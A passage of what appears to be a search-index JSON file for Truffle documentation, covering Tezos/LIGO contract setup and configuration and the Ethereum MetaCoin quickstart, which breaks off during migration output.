for an existing project (for example, init ) wouldn't make sense (for example, develop or console ). See full command reference for more information.","title":"Commands available"},{"location":"docs/tezos/truffle/getting-started/writing-external-scripts-with-tezos.html","text":"Tezos support in Truffle is experimental. Give it a spin, and help us out by filing issues on Github . Writing External Scripts \u00b6 Often you may want to run external scripts that interact with your deployed contracts, or in some cases deploy new contracts! Truffle provides an easy way to do this, bootstrapping your contracts based on your desired network and connecting to your Tezos client automatically per your project configuration . Command \u00b6 To run an external script, perform the following: $ truffle exec <path/to/file.js> Refer to Truffle Commands Reference for more information about this command, such as what options it accepts. File structure \u00b6 In order for external scripts to be run correctly, Truffle expects them to export a function that takes a single parameter as a callback: module . exports = function ( callback ) { // perform actions } You can do anything you'd like within this script, so long as the callback is called when the script finishes. The callback accepts an error as its first and only parameter. If an error is provided, execution will halt and the process will return a non-zero exit code. artifacts.require() \u00b6 Note that the artifacts.require() function available in migrations is also available to you within external scripts. Here's an example of how you might use it to deploy a new contract outside of Truffle's migration system: Filename: ./script.js const SimpleStorage = artifacts . require ( \"SimpleStorage\" ); module . exports = callback => { SimpleStorage . new ( 3 ). then (( instance ) => { console . log ( \"New address:\" , instance . address ); callback (); }). catch ( callback ); }; The output would look like this: $ truffle exec ./script.js Using network 'development' . New address: KT1JZ8JQ4ziGCsQJcTegNcByYGW32ZhXD217","title":"Truffle | Writing External Scripts with Tezos"},{"location":"docs/tezos/truffle/getting-started/writing-external-scripts-with-tezos.html#writing-external-scripts","text":"Often you may want to run external scripts that interact with your deployed contracts, or in some cases deploy new contracts! Truffle provides an easy way to do this, bootstrapping your contracts based on your desired network and connecting to your Tezos client automatically per your project configuration .","title":"Writing External Scripts"},{"location":"docs/tezos/truffle/getting-started/writing-external-scripts-with-tezos.html#command","text":"To run an external script, perform the following: $ truffle exec <path/to/file.js> Refer to Truffle Commands Reference for more information about this command, such as what options it accepts.","title":"Command"},{"location":"docs/tezos/truffle/getting-started/writing-external-scripts-with-tezos.html#file-structure","text":"In order for external scripts to be run correctly, Truffle expects them to export a function that takes a single parameter as a callback: module . exports = function ( callback ) { // perform actions } You can do anything you'd like within this script, so long as the callback is called when the script finishes. The callback accepts an error as its first and only parameter. If an error is provided, execution will halt and the process will return a non-zero exit code.","title":"File structure"},{"location":"docs/tezos/truffle/getting-started/writing-external-scripts-with-tezos.html#artifactsrequire","text":"Note that the artifacts.require() function available in migrations is also available to you within external scripts. Here's an example of how you might use it to deploy a new contract outside of Truffle's migration system: Filename: ./script.js const SimpleStorage = artifacts . require ( \"SimpleStorage\" ); module . exports = callback => { SimpleStorage . new ( 3 ). then (( instance ) => { console . log ( \"New address:\" , instance . address ); callback (); }). catch ( callback ); }; The output would look like this: $ truffle exec ./script.js Using network 'development' . New address: KT1JZ8JQ4ziGCsQJcTegNcByYGW32ZhXD217","title":"artifacts.require()"},{"location":"docs/tezos/truffle/getting-started/writing-tezos-contracts.html","text":"Tezos support in Truffle is experimental. Give it a spin, and help us out by filing issues on Github . Writing Tezos Contracts \u00b6 Smart contracts in Tezos are written in the LIGO programming language . We recommend you familiarize yourself with the language before continuing. Their documentation is excellent. Main language site Online sandbox Documentation Note! LIGO supports three different syntaxes out of the box: CamelLIGO, PascalLIGO, and ReasonLIGO. For all examples in this documentation, we use PascalLIGO. Example Contract & Overview \u00b6 All contracts within a Tezos-based Truffle project are stored in the ./contracts directory. An example contract looks like the following: // variant defining pseudo multi-entrypoint actions type action is | Increment of int | Decrement of int function add (const a : int ; const b : int) : int is a + b function subtract (const a : int ; const b : int) : int is a - b // real entrypoint that re-routes the flow based on the action provided function main (const p : action ; const s : int) : (list(operation) * int) is ((nil : list(operation)), case p of | Increment (n) -> add (s, n) | Decrement (n) -> subtract (s, n) end) There's some important takeaways to note when writing LIGO contracts: By default, all LIGO contracts have a single entry point called main , expected by Truffle. For multiple entry points, see below. The last parameter to the entry point function represents the current state of the contract, and is sent to the function via the underlying protocol. All LIGO contracts return two things: A list of further operations the protocol should perform, and the final state of the contract after execution of the entry point. Defining Multiple Entry Points \u00b6 You'll notice that the comments in the example contract above suggest there are multiple entry points beyond main() . Conceptually there are multiple entry points -- increment and decrement -- but under the hood, main() is technically the single entery point of the contract. To code a contract with multiple entry points that Truffle can take advantage of, you'll need to follow the example above. Start by defining an enum-like type called action with values relative to the functions being called, and then pass the action as the first value into main() . As you'll see in the Interacting With Your Contracts section, if Truffle detects an action type as the first parameter in main() , it'll treat your contract as though it has multiple entry points, and make those entry points easy to call from outside the blockchain. Including Other Contracts \u00b6 Sometimes it's nice to organize your code in multiple files. Fortunately, the LIGO compiler does this for you. To do so, check out the LIGO documentation for more. You'll still need one contract that contains a main() function, though you can organize other contract code in other files as needed. How do I compile? \u00b6 It's easy. See the Compiling Tezos Contracts section for more!","title":"Truffle | Writing Tezos Contracts | Tezos"},{"location":"docs/tezos/truffle/getting-started/writing-tezos-contracts.html#writing-tezos-contracts","text":"Smart contracts in Tezos are written in the LIGO programming language . We recommend you familiarize yourself with the language before continuing. Their documentation is excellent. Main language site Online sandbox Documentation Note! LIGO supports three different syntaxes out of the box: CamelLIGO, PascalLIGO, and ReasonLIGO. For all examples in this documentation, we use PascalLIGO.","title":"Writing Tezos Contracts"},{"location":"docs/tezos/truffle/getting-started/writing-tezos-contracts.html#example-contract-overview","text":"All contracts within a Tezos-based Truffle project are stored in the ./contracts directory. An example contract looks like the following: // variant defining pseudo multi-entrypoint actions type action is | Increment of int | Decrement of int function add (const a : int ; const b : int) : int is a + b function subtract (const a : int ; const b : int) : int is a - b // real entrypoint that re-routes the flow based on the action provided function main (const p : action ; const s : int) : (list(operation) * int) is ((nil : list(operation)), case p of | Increment (n) -> add (s, n) | Decrement (n) -> subtract (s, n) end) There's some important takeaways to note when writing LIGO contracts: By default, all LIGO contracts have a single entry point called main , expected by Truffle. For multiple entry points, see below. The last parameter to the entry point function represents the current state of the contract, and is sent to the function via the underlying protocol. All LIGO contracts return two things: A list of further operations the protocol should perform, and the final state of the contract after execution of the entry point.","title":"Example Contract &amp; Overview"},{"location":"docs/tezos/truffle/getting-started/writing-tezos-contracts.html#defining-multiple-entry-points","text":"You'll notice that the comments in the example contract above suggest there are multiple entry points beyond main() . Conceptually there are multiple entry points -- increment and decrement -- but under the hood, main() is technically the single entery point of the contract. To code a contract with multiple entry points that Truffle can take advantage of, you'll need to follow the example above. Start by defining an enum-like type called action with values relative to the functions being called, and then pass the action as the first value into main() . As you'll see in the Interacting With Your Contracts section, if Truffle detects an action type as the first parameter in main() , it'll treat your contract as though it has multiple entry points, and make those entry points easy to call from outside the blockchain.","title":"Defining Multiple Entry Points"},{"location":"docs/tezos/truffle/getting-started/writing-tezos-contracts.html#including-other-contracts","text":"Sometimes it's nice to organize your code in multiple files. Fortunately, the LIGO compiler does this for you. To do so, check out the LIGO documentation for more. You'll still need one contract that contains a main() function, though you can organize other contract code in other files as needed.","title":"Including Other Contracts"},{"location":"docs/tezos/truffle/getting-started/writing-tezos-contracts.html#how-do-i-compile","text":"It's easy. See the Compiling Tezos Contracts section for more!","title":"How do I compile?"},{"location":"docs/tezos/truffle/quickstart/index.html","text":"Tezos support in Truffle is experimental. Give it a spin, and help us out by filing issues on Github . Tezos Quickstart \u00b6 Wanna build apps on Tezos using Truffle? You're in the right place. Table of Contents \u00b6 Getting set up Installing Truffle Using the Tezos Truffle Box Writing Contracts Deploying Contracts Testing Contracts Further Resources Getting Set Up \u00b6 Installing Docker \u00b6 Before you can start developing Tezos applications with Truffle, you'll first need to ensure you have Docker installed on your machine. Installing docker let's Truffle easily use the latest LIGO compiler on any platform. See Docker install instructions for your platform. Docker on Windows: If you're developing on Windows, you need to install the Docker edge release instead of the mainline docker version. Trust us: This is a better experience. Other Requirements \u00b6 NodeJS v8.9.4 or later Windows, Linux or Mac OS X Installing Truffle \u00b6 You'll need to download a special version of Truffle to use Tezos. $ npm install -g truffle@tezos If you already have Truffle installed, we recommend uninstalling truffle before running the above command. Using the Tezos Truffle Box \u00b6 This quick start uses an already-created project to provide the base Truffle project structure and example contracts. In your workspace directory, run the following commands: $ mkdir tezos-example $ cd tezos-example $ truffle unbox tezos-example Writing Contracts \u00b6 The example box comes with two contracts, which you can find in the ./contracts folder: Counter.ligo Migrations.ligo SimpleStorage.ligo You can see that these contracts end in the .ligo file extension. This refers to the LIGO programming language . See the Writing Tezos contracts section for more info. Deploying Contracts \u00b6 For this quick start, we're going to configure your project to deploy to the Delphinet or any other existing test network for Tezos. This is the quickest way to get started, though as you get familiar with Tezos, you'll want to set up a local development environment. See the example box documentation for an example on using a local flextesa sandbox. Configuring Truffle to point to the Tezos testnet \u00b6 First, navigate to https://faucet.tzalpha.net/ to get a faucet account. This will create a new account for you on the testnet and fill it with some testnet XTZ. This account is valid for all Tezos test networks. Download the file and save it as faucet.json in the root of your project. Next, replace the box's truffle-config.js with the following: const { mnemonic , secret , password , email } = require ( \"./faucet.json\" ); module . exports = { // see <http://truffleframework.com/docs/advanced/configuration> // for more details on how to specify configuration options! networks : { development : { host : \"https://delphinet.smartpy.io\" , port : 443 , network_id : \"*\" , secret , mnemonic , password , email , type : \"tezos\" } } }; That's it! You're all set to run the box's deployment scripts against a testnet. Note: The default tezos box is configured to deploy to multiple networks, including mainnet. If you'd like to deploy to those networks, you'll need to first configure the `secret`, `mnemonic`, `password`, and `email` like the above to represent an account you own that's funded with XTZ. See the Configuring Tezos Projects section for more info. Caution! Keep your `secret`, `mnemonic` and `password` safe! When not on a testnet, you can quickly lose all your tez if someone else gets ahold of them. Running Truffle's deployment scripts \u00b6 The example box comes default with pre-written deployment scripts, found within the ./migrations directory: 1_initial_migration.js 2_deploy_simple_storage.js 3_deploy_counter.js Truffle will handle running these scripts when you run the following command: $ truffle migrate See the Deploying Tezos contracts section for more information on how to write and use Truffle's deployment scripts. Testing Contracts \u00b6 The box also comes equipped with tests, showing you how to write automated tests for your Tezos contracts. You can find these tests in the ./test directory: counter.test.js simpleStorage.test.js See the Testing Tezos contracts section for more information on how to write tests for your LIGO congrats. Running your tests is easy, by running following command: $ truffle test Further Resources \u00b6 If you've reached this point, you now have a Truffle project that lets you compile, test, and deploy LIGO contracts to the Tezos test network. Congrats! This is a great start, but there's still much to learn. We suggest you check out the following resources to learn more about Tezos, LIGO, and Truffle: LIGO language documentation Tezos documentation Taquito communcation library Main Truffle Suite documentation","title":"Tezos Quickstart"},{"location":"docs/tezos/truffle/quickstart/index.html#tezos-quickstart","text":"Wanna build apps on Tezos using Truffle? You're in the right place.","title":"Tezos Quickstart"},{"location":"docs/tezos/truffle/quickstart/index.html#table-of-contents","text":"Getting set up Installing Truffle Using the Tezos Truffle Box Writing Contracts Deploying Contracts Testing Contracts Further Resources","title":"Table of Contents"},{"location":"docs/tezos/truffle/quickstart/index.html#getting-set-up","text":"","title":"Getting Set Up"},{"location":"docs/tezos/truffle/quickstart/index.html#installing-docker","text":"Before you can start developing Tezos applications with Truffle, you'll first need to ensure you have Docker installed on your machine. Installing docker let's Truffle easily use the latest LIGO compiler on any platform. See Docker install instructions for your platform. Docker on Windows: If you're developing on Windows, you need to install the Docker edge release instead of the mainline docker version. Trust us: This is a better experience.","title":"Installing Docker"},{"location":"docs/tezos/truffle/quickstart/index.html#other-requirements","text":"NodeJS v8.9.4 or later Windows, Linux or Mac OS X","title":"Other Requirements"},{"location":"docs/tezos/truffle/quickstart/index.html#installing-truffle","text":"You'll need to download a special version of Truffle to use Tezos. $ npm install -g truffle@tezos If you already have Truffle installed, we recommend uninstalling truffle before running the above command.","title":"Installing Truffle"},{"location":"docs/tezos/truffle/quickstart/index.html#using-the-tezos-truffle-box","text":"This quick start uses an already-created project to provide the base Truffle project structure and example contracts. In your workspace directory, run the following commands: $ mkdir tezos-example $ cd tezos-example $ truffle unbox tezos-example","title":"Using the Tezos Truffle Box"},{"location":"docs/tezos/truffle/quickstart/index.html#writing-contracts","text":"The example box comes with two contracts, which you can find in the ./contracts folder: Counter.ligo Migrations.ligo SimpleStorage.ligo You can see that these contracts end in the .ligo file extension. This refers to the LIGO programming language . See the Writing Tezos contracts section for more info.","title":"Writing Contracts"},{"location":"docs/tezos/truffle/quickstart/index.html#deploying-contracts","text":"For this quick start, we're going to configure your project to deploy to the Delphinet or any other existing test network for Tezos. This is the quickest way to get started, though as you get familiar with Tezos, you'll want to set up a local development environment. See the example box documentation for an example on using a local flextesa sandbox.","title":"Deploying Contracts"},{"location":"docs/tezos/truffle/quickstart/index.html#configuring-truffle-to-point-to-the-tezos-testnet","text":"First, navigate to https://faucet.tzalpha.net/ to get a faucet account. This will create a new account for you on the testnet and fill it with some testnet XTZ. This account is valid for all Tezos test networks. Download the file and save it as faucet.json in the root of your project. Next, replace the box's truffle-config.js with the following: const { mnemonic , secret , password , email } = require ( \"./faucet.json\" ); module . exports = { // see <http://truffleframework.com/docs/advanced/configuration> // for more details on how to specify configuration options! networks : { development : { host : \"https://delphinet.smartpy.io\" , port : 443 , network_id : \"*\" , secret , mnemonic , password , email , type : \"tezos\" } } }; That's it! You're all set to run the box's deployment scripts against a testnet. Note: The default tezos box is configured to deploy to multiple networks, including mainnet. If you'd like to deploy to those networks, you'll need to first configure the `secret`, `mnemonic`, `password`, and `email` like the above to represent an account you own that's funded with XTZ. See the Configuring Tezos Projects section for more info. Caution! Keep your `secret`, `mnemonic` and `password` safe! When not on a testnet, you can quickly lose all your tez if someone else gets ahold of them.","title":"Configuring Truffle to point to the Tezos testnet"},{"location":"docs/tezos/truffle/quickstart/index.html#running-truffles-deployment-scripts","text":"The example box comes default with pre-written deployment scripts, found within the ./migrations directory: 1_initial_migration.js 2_deploy_simple_storage.js 3_deploy_counter.js Truffle will handle running these scripts when you run the following command: $ truffle migrate See the Deploying Tezos contracts section for more information on how to write and use Truffle's deployment scripts.","title":"Running Truffle's deployment scripts"},{"location":"docs/tezos/truffle/quickstart/index.html#testing-contracts","text":"The box also comes equipped with tests, showing you how to write automated tests for your Tezos contracts. You can find these tests in the ./test directory: counter.test.js simpleStorage.test.js See the Testing Tezos contracts section for more information on how to write tests for your LIGO congrats. Running your tests is easy, by running following command: $ truffle test","title":"Testing Contracts"},{"location":"docs/tezos/truffle/quickstart/index.html#further-resources","text":"If you've reached this point, you now have a Truffle project that lets you compile, test, and deploy LIGO contracts to the Tezos test network. Congrats! This is a great start, but there's still much to learn. We suggest you check out the following resources to learn more about Tezos, LIGO, and Truffle: LIGO language documentation Tezos documentation Taquito communcation library Main Truffle Suite documentation","title":"Further Resources"},{"location":"docs/tezos/truffle/reference/configuring-tezos-projects.html","text":"Tezos support in Truffle is experimental. Give it a spin, and help us out by filing issues on Github . Configuring your Tezos Project \u00b6 Location \u00b6 Your configuration file is called truffle-config.js and is located at the root of your project directory. This file is a Javascript file and can execute any code necessary to create your configuration. It must export an object representing your project configuration like the example below. const { mnemonic , secret , password , email } = require ( \"./faucet.json\" ); module . exports = { // see <http://truffleframework.com/docs/advanced/configuration> // for more details on how to specify configuration options! networks : { development : { host : \"https://delphinet.smartpy.io\" , port : 443 , network_id : \"*\" , secret , mnemonic , password , email , type : \"tezos\" } } }; Configuring your project to deploy to a public test network \u00b6 The above configuration defines a single development network pointed at the public Delphinet test network. You can see how this is set up in context by following our quickstart . Developing on public test nets can be limiting for a number of reasons (acquiring test net tokens, performance, and internet connectivity, among others). Fortunately, there's a local solution. Setting up a local test network with Flextesa \u00b6 Enter Flextesa. \"Flextesa\" is short for flexible test sandboxes , and can help you quickly set up a Tezos environment locally. Our example Tezos box comes with scripts to spin up a flextesa environment with zero-work. Check out the documentation . If you're going to set up a flextesa environment on your own, you'll want to perform the following: Run the flextesa environment via docker ( see example ) Configure your Truffle project to point to the flextesa environment. ( see example ) Import the default private key into your Truffle configuration. ( see example ) Suported configuration options \u00b6 networks \u00b6 Specifies which networks are available for deployment during migrations. When compiling and running migrations on a specific network, contract artifacts will be saved and recorded for later use. When your contract abstractions detect that your Tezos client is connected to a specific network, they'll use the contract artifacts associated that network to simplify app deployment. The networks object, shown below, is keyed by a network name and contains a corresponding object that defines the parameters of the network. The networks option is required, as if you have no network configuration, Truffle will not be able to deploy your contracts. The default network configuration provided by the Tezos example Truffle box specifies multiple available networks, including mainnet and the Babylon testnet. To configure Truffle to connect to other networks, simply add more named networks and specify the corresponding network id. The network name is used for user interface purposes, such as when running your migrations on a specific network: $ truffle migrate --network delphinet Example: networks : { development : { host : \"https://delphinet.smartpy.io\" , port : 443 , network_id : \"*\" , type : \"tezos\" }, delphinet : { host : \"https://delphinet.smartpy.io\" , port : 443 , network_id : \"*\" , type : \"tezos\" }, mainnet : { host : \"https://mainnet.smartpy.io\" , port : 443 , network_id : \"*\" , type : \"tezos\" }, zeronet : { host : \"https://zeronet.smartpy.io\" , port : 443 , network_id : \"*\" , type : \"tezos\" } } contracts_directory \u00b6 The default directory for uncompiled contracts is ./contracts relative to the project root. If you wish to keep your contracts in a different directory you may specify a contracts_directory property. Example: To have Truffle find contracts in ./allMyStuff/someStuff/theContractFolder (recursively) at compile time: module . exports = { contracts_directory : \"./allMyStuff/someStuff/theContractFolder\" , networks : { // ... } }; Note : In addition to specifying a relative path, you can also use globs/regular expressions to selectively compile contracts. contracts_build_directory \u00b6 The default output directory for compiled contracts is ./build/contracts relative to the project root. This can be changed with the contracts_build_directory key. Examples: To place the built contract artifacts in ./output/contracts : module . exports = { contracts_build_directory : \"./output\" , networks : { // ... } }; The built contract artifacts do not need to be inside the project root: module . exports = { contracts_build_directory : \"../../../output\" , networks : { // ... } }; Absolute paths will also work. This is not recommended though, as an absolute path may not exist when compiled on another system. If you use absolute paths on Windows, make sure to use double backslashes for paths (example: C:\\\\Users\\\\Username\\\\output ). migrations_directory \u00b6 The default migrations directory is ./migrations relative to the project root. This can be changed with the migrations_directory key. Example: module . exports = { migrations_directory : \"./allMyStuff/someStuff/theMigrationsFolder\" , networks : { // ... } }; mocha \u00b6 Configuration options for the MochaJS testing framework. This configuration expects an object as detailed in Mocha's documentation . Example: mocha : { useColors : true } plugins \u00b6 Note : This feature is new and still in a barebones state. Please let us know how we can improve it! Provides Truffle with a list of installed third-party extensions installed as NPM package dependencies. Truffle plugin support is currently limited to plugins that define custom workflow commands. For more information, see Third-Party Plugin Commands .","title":"Truffle | Configuring Your Project | Tezos"},{"location":"docs/tezos/truffle/reference/configuring-tezos-projects.html#configuring-your-tezos-project","text":"","title":"Configuring your Tezos Project"},{"location":"docs/tezos/truffle/reference/configuring-tezos-projects.html#location","text":"Your configuration file is called truffle-config.js and is located at the root of your project directory. This file is a Javascript file and can execute any code necessary to create your configuration. It must export an object representing your project configuration like the example below. const { mnemonic , secret , password , email } = require ( \"./faucet.json\" ); module . exports = { // see <http://truffleframework.com/docs/advanced/configuration> // for more details on how to specify configuration options! networks : { development : { host : \"https://delphinet.smartpy.io\" , port : 443 , network_id : \"*\" , secret , mnemonic , password , email , type : \"tezos\" } } };","title":"Location"},{"location":"docs/tezos/truffle/reference/configuring-tezos-projects.html#configuring-your-project-to-deploy-to-a-public-test-network","text":"The above configuration defines a single development network pointed at the public Delphinet test network. You can see how this is set up in context by following our quickstart . Developing on public test nets can be limiting for a number of reasons (acquiring test net tokens, performance, and internet connectivity, among others). Fortunately, there's a local solution.","title":"Configuring your project to deploy to a public test network"},{"location":"docs/tezos/truffle/reference/configuring-tezos-projects.html#setting-up-a-local-test-network-with-flextesa","text":"Enter Flextesa. \"Flextesa\" is short for flexible test sandboxes , and can help you quickly set up a Tezos environment locally. Our example Tezos box comes with scripts to spin up a flextesa environment with zero-work. Check out the documentation . If you're going to set up a flextesa environment on your own, you'll want to perform the following: Run the flextesa environment via docker ( see example ) Configure your Truffle project to point to the flextesa environment. ( see example ) Import the default private key into your Truffle configuration. ( see example )","title":"Setting up a local test network with Flextesa"},{"location":"docs/tezos/truffle/reference/configuring-tezos-projects.html#suported-configuration-options","text":"","title":"Suported configuration options"},{"location":"docs/tezos/truffle/reference/configuring-tezos-projects.html#networks","text":"Specifies which networks are available for deployment during migrations. When compiling and running migrations on a specific network, contract artifacts will be saved and recorded for later use. When your contract abstractions detect that your Tezos client is connected to a specific network, they'll use the contract artifacts associated that network to simplify app deployment. The networks object, shown below, is keyed by a network name and contains a corresponding object that defines the parameters of the network. The networks option is required, as if you have no network configuration, Truffle will not be able to deploy your contracts. The default network configuration provided by the Tezos example Truffle box specifies multiple available networks, including mainnet and the Babylon testnet. To configure Truffle to connect to other networks, simply add more named networks and specify the corresponding network id. The network name is used for user interface purposes, such as when running your migrations on a specific network: $ truffle migrate --network delphinet Example: networks : { development : { host : \"https://delphinet.smartpy.io\" , port : 443 , network_id : \"*\" , type : \"tezos\" }, delphinet : { host : \"https://delphinet.smartpy.io\" , port : 443 , network_id : \"*\" , type : \"tezos\" }, mainnet : { host : \"https://mainnet.smartpy.io\" , port : 443 , network_id : \"*\" , type : \"tezos\" }, zeronet : { host : \"https://zeronet.smartpy.io\" , port : 443 , network_id : \"*\" , type : \"tezos\" } }","title":"networks"},{"location":"docs/tezos/truffle/reference/configuring-tezos-projects.html#contracts_directory","text":"The default directory for uncompiled contracts is ./contracts relative to the project root. If you wish to keep your contracts in a different directory you may specify a contracts_directory property. Example: To have Truffle find contracts in ./allMyStuff/someStuff/theContractFolder (recursively) at compile time: module . exports = { contracts_directory : \"./allMyStuff/someStuff/theContractFolder\" , networks : { // ... } }; Note : In addition to specifying a relative path, you can also use globs/regular expressions to selectively compile contracts.","title":"contracts_directory"},{"location":"docs/tezos/truffle/reference/configuring-tezos-projects.html#contracts_build_directory","text":"The default output directory for compiled contracts is ./build/contracts relative to the project root. This can be changed with the contracts_build_directory key. Examples: To place the built contract artifacts in ./output/contracts : module . exports = { contracts_build_directory : \"./output\" , networks : { // ... } }; The built contract artifacts do not need to be inside the project root: module . exports = { contracts_build_directory : \"../../../output\" , networks : { // ... } }; Absolute paths will also work. This is not recommended though, as an absolute path may not exist when compiled on another system. If you use absolute paths on Windows, make sure to use double backslashes for paths (example: C:\\\\Users\\\\Username\\\\output ).","title":"contracts_build_directory"},{"location":"docs/tezos/truffle/reference/configuring-tezos-projects.html#migrations_directory","text":"The default migrations directory is ./migrations relative to the project root. This can be changed with the migrations_directory key. Example: module . exports = { migrations_directory : \"./allMyStuff/someStuff/theMigrationsFolder\" , networks : { // ... } };","title":"migrations_directory"},{"location":"docs/tezos/truffle/reference/configuring-tezos-projects.html#mocha","text":"Configuration options for the MochaJS testing framework. This configuration expects an object as detailed in Mocha's documentation . Example: mocha : { useColors : true }","title":"mocha"},{"location":"docs/tezos/truffle/reference/configuring-tezos-projects.html#plugins","text":"Note : This feature is new and still in a barebones state. Please let us know how we can improve it! Provides Truffle with a list of installed third-party extensions installed as NPM package dependencies. Truffle plugin support is currently limited to plugins that define custom workflow commands. For more information, see Third-Party Plugin Commands .","title":"plugins"},{"location":"docs/truffle/index.html","text":"Overview \u00b6 A world class development environment, testing framework and asset pipeline for blockchains using the Ethereum Virtual Machine (EVM), aiming to make life as a developer easier. With Truffle, you get: Built-in smart contract compilation, linking, deployment and binary management. Automated contract testing for rapid development. Scriptable, extensible deployment & migrations framework. Network management for deploying to any number of public & private networks. Package management with EthPM & NPM, using the ERC190 standard. Interactive console for direct contract communication. Configurable build pipeline with support for tight integration. External script runner that executes scripts within a Truffle environment.","title":"Overview"},{"location":"docs/truffle/index.html#overview","text":"A world class development environment, testing framework and asset pipeline for blockchains using the Ethereum Virtual Machine (EVM), aiming to make life as a developer easier. With Truffle, you get: Built-in smart contract compilation, linking, deployment and binary management. Automated contract testing for rapid development. Scriptable, extensible deployment & migrations framework. Network management for deploying to any number of public & private networks. Package management with EthPM & NPM, using the ERC190 standard. Interactive console for direct contract communication. Configurable build pipeline with support for tight integration. External script runner that executes scripts within a Truffle environment.","title":"Overview"},{"location":"docs/truffle/quickstart.html","text":"Truffle Quickstart \u00b6 This page will take you through the basics of creating a Truffle project and deploying a smart contract to a blockchain. Note : Before you begin, make sure that you read our Ethereum Overview page. Table of Contents \u00b6 Creating a project Exploring the project Testing Compiling Migrating with Truffle Develop Alternative: Migrating with Ganache Interacting with the contract Creating a project \u00b6 To use most Truffle commands, you need to run them against an existing Truffle project. So the first step is to create a Truffle project. You can create a bare project template, but for those just getting started, you can use Truffle Boxes , which are example applications and project templates. We'll use the MetaCoin box , which creates a token that can be transferred between accounts: Create a new directory for your Truffle project: mkdir MetaCoin cd MetaCoin Download (\"unbox\") the MetaCoin box: truffle unbox metacoin Note : You can use the truffle unbox <box-name> command to download any of the other Truffle Boxes. Note : To create a bare Truffle project with no smart contracts included, use truffle init . Once this operation is completed, you'll now have a project structure with the following items: contracts/ : Directory for Solidity contracts migrations/ : Directory for scriptable deployment files test/ : Directory for test files for testing your application and contracts truffle.js : Truffle configuration file Exploring the project \u00b6 Note : This page is just a quickstart, so we're not going to go into much detail here. Please see the rest of the Truffle documentation to learn more. Open the contracts/MetaCoin.sol file in a text editor. This is a smart contract (written in Solidity) that creates a MetaCoin token. Note that this also references another Solidity file contracts/ConvertLib.sol in the same directory. Open the contracts/Migrations.sol file. This is a separate Solidity file that manages and updates the status of your deployed smart contract . This file comes with every Truffle project, and is usually not edited. Open the migrations/1_initial_migration.js file. This file is the migration (deployment) script for the Migrations contract found in the Migrations.sol file. Open the migrations/2_deploy_contracts.js file. This file is the migration script for the MetaCoin contract. (Migration scripts are run in order, so the file beginning with 2 will be run after the file beginning with 1 .) Open the test/TestMetaCoin.sol file. This is a test file written in Solidity which ensures that your contract is working as expected. Open the test/metacoin.js file. This is a test file written in JavaScript which performs a similar function to the Solidity test above. Open the truffle-config.js file. This is the Truffle configuration file , for setting network information and other project-related settings. The file is blank, but this is okay, as we'll be using a Truffle command that has some defaults built-in. Testing \u00b6 On a terminal, run the Solidity test: truffle test ./test/TestMetaCoin.sol You will see the following output TestMetacoin \u221a testInitialBalanceUsingDeployedContract (71ms) \u221a testInitialBalanceWithNewMetaCoin (59ms) 2 passing (794ms) Note : If you're on Windows and encountering problems running this command, please see the documentation on resolving naming conflicts on Windows . These tree tests were run against the contract, with descriptions displayed on what the tests are supposed to do. Run the JavaScript test: truffle test ./test/metacoin.js You will see the following output Contract: MetaCoin \u221a should put 10000 MetaCoin in the first account \u221a should call a function that depends on a linked library (40ms) \u221a should send coin correctly (129ms) 3 passing (255ms) Compiling \u00b6 Compile the smart contracts: truffle compile You will see the following output: Compiling .\\contracts\\ConvertLib.sol... Compiling .\\contracts\\MetaCoin.sol... Compiling .\\contracts\\Migrations.sol... Writing artifacts to .\\build\\contracts Migrating with Truffle Develop \u00b6 Note : To use Ganache , please skip to the next section. To deploy our smart contracts, we're going to need to connect to a blockchain. Truffle has a built-in personal blockchain that can be used for testing. This blockchain is local to your system and does not interact with the main Ethereum network. You can create this blockchain and interact with it using Truffle Develop . Run Truffle Develop: truffle develop You will see the following information: Truffle Develop started at http://127.0.0.1:9545/ Accounts: (0) 0x627306090abab3a6e1400e9345bc60c78a8bef57 (1) 0xf17f52151ebef6c7334fad080c5704d77216b732 (2) 0xc5fdf4076b8f3a5357c5e395ab970b5b54098fef (3) 0x821aea9a577a9b44299b9c15c88cf3087f3b5544 (4) 0x0d1d4e623d10f9fba5db95830f7d3839406c6af2 (5) 0x2932b7a2355d6fecc4b5c0b6bd44cc31df247a2e (6) 0x2191ef87e392377ec08e7c08eb105ef5448eced5 (7) 0x0f4f2ac550a1b4e2280d04c21cea7ebd822934b5 (8) 0x6330a553fc93768f612722bb8c2ec78ac90b3bbc (9) 0x5aeda56215b167893e80b4fe645ba6d5bab767de Private Keys: (0) c87509a1c067bbde78beb793e6fa76530b6382a4c0241e5e4a9ec0a0f44dc0d3 (1) ae6ae8e5ccbfb04590405997ee2d52d2b330726137b875053c36d94e974d162f (2) 0dbbe8e4ae425a6d2687f1a7e3ba17bc98c673636790f1b8ad91193c05875ef1 (3) c88b703fb08cbea894b6aeff5a544fb92e78a18e19814cd85da83b71f772aa6c (4) 388c684f0ba1ef5017716adb5d21a053ea8e90277d0868337519f97bede61418 (5) 659cbb0e2411a44db63778987b1e22153c086a95eb6b18bdf89de078917abc63 (6) 82d052c865f5763aad42add438569276c00d3d88a2d062d36b2bae914d58b8c8 (7) aa3680d5d48a8283413f7a108367c7299ca73f553735860a87b08f39395618b7 (8) 0f62d96d6675f32685bbdb8ac13cda7c23436f63efbb9d07700d8669ff12b7c4 (9) 8d5366123cb560bb606379f90a0bfd4769eecc0557f1b362dcae9012b548b1e5 Mnemonic: candy maple cake sugar pudding cream honey rich smooth crumble sweet treat \u26a0\ufe0f Important \u26a0\ufe0f : This mnemonic was created for you by Truffle. It is not secure. Ensure you do not use it on production blockchains, or else you risk losing funds. truffle(development)> This shows ten accounts (and their private keys) that can be used when interacting with the blockchain. On the Truffle Develop prompt, Truffle commands can be run by omitting the truffle prefix. For example, to run truffle compile on the prompt, type compile . The command to deploy your compiled contracts to the blockchain is truffle migrate , so at the prompt, type: migrate You will see the following output: Starting migrations... ====================== > Network name: 'develop' > Network id: 4447 > Block gas limit: 6721975 1_initial_migration.js ====================== Deploying 'Migrations' ---------------------- > transaction hash: 0x3fd222279dad48583a3320decd0a2d12e82e728ba9a0f19bdaaff98c72a030a2 > Blocks: 0 Seconds: 0 > contract address: 0xa0AdaB6E829C818d50c75F17CFCc2e15bfd55a63 > account: 0x627306090abab3a6e1400e9345bc60c78a8bef57 > balance: 99.99445076 > gas used: 277462 > gas price: 20 gwei > value sent: 0 ETH > total cost: 0.00554924 ETH > Saving migration to chain. > Saving artifacts ------------------------------------- > Total cost: 0.00554924 ETH 2_deploy_contracts.js ===================== Deploying 'ConvertLib' ---------------------- > transaction hash: 